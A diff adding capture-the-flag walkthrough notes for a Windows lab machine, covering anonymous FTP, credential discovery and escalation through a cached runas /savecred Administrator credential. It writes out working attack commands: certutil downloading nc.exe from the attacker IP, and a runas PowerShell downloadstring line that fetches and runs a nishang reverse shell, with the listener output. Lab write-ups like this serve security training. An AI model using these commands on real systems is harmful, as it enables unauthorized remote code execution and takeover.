@@ -1,4 +1,18 @@
 #windows 
+# Story
+1. Nmap port scan
+2. Ftp allows anonymous access
+3. Get files from ftp
+4. Check http
+5. Check backup.mdb
+6. There are some credentials for zip file
+7. Unzip the zip file with the password from mdb file
+8. Check the email
+9. Log in to telnet (user flag)
+10. Enumerate the machine
+11. Public Desktop has some interesting lnk file
+12. We can use runas without password
+13. Perform reverse shell as root (root flag)
 
 # Enumeration
 ## Nmap
@@ -212,4 +226,124 @@ C:\Users\Public\Desktop>dir
                0 Dir(s)   3,309,441,024 bytes free
 ```
 
+```
+type "ZKAccess3.5 Security System.lnk"
+C:\Users\Public\Desktoptype "ZKAccess3.5 Security System.lnk
+L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
+                                   runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
+               �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
+                                                   O�j)�H���
+                                                            )ΰ[�_���8{E�3
+ O�j)�H���
+          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
+C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
+L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
+                                   runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
+               �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
+                                                   O�j)�H���
+                                                            )ΰ[�_���8{E�3
+ O�j)�H���
+          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
+```
+
+```
+C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred 
+```
+runas and /savecred??
+
+### cmdkey
+```
+C:\Users\Public\Desktop>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+```
+
+Seems like admin cred is cached.
+
+### net user
+```
+C:\Users\Public\Desktop>net user administrator
+User name                    Administrator
+Full Name                    
+Comment                      Built-in account for administering the computer/domain
+User's comment               
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            8/21/2018 9:01:12 PM
+Password expires             Never
+Password changeable          8/21/2018 9:01:12 PM
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2/22/2023 2:09:24 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+Password is not required, so this means that we can use runas without password.
+
+## Reverse shell for root
+### Unsuccessful attempt
+### upload nc to the compromised machine
+In User security
+```
+certutil -urlcache -split -f http://10.10.14.17:8080/nc.exe nc.exe
+```
+
+```
+runas /savecred /user:ACCESS\Administrator "ping -n 4 10.10.14.17"
+```
+`sudo tcpdump -i tun0 icmp`
+ping works so runas is working, it just does not return anything
+
+The command below should work but it did not work. I am not sure why since ping is working.
+```
+runas /savecred /user:ACCESS\Administrator "nc.exe -c cmd.exe 10.10.14.17 1234"
+```
+
+
+### Successful one
+We can create the shell using Invoke-PowerShellTcp.ps1.
+https://github.com/samratashok/nishang
+
+At the end of the line, we need to add
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 1234`
+
+From security machine
+```
+runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.17:8080/shell.ps1')"
+```
+
+In Kali
+Open python server in the same directory as the shell.ps1.
+Open another shell for nc listener.
+
+
+## Root flag
+```
+nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.129.88.24] 49174
+whoWindows PowerShell running as user Administrator on ACCESS
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>    
+```
+
+```
+PS C:\Users\Administrator\Desktop> type root.txt
+```
 
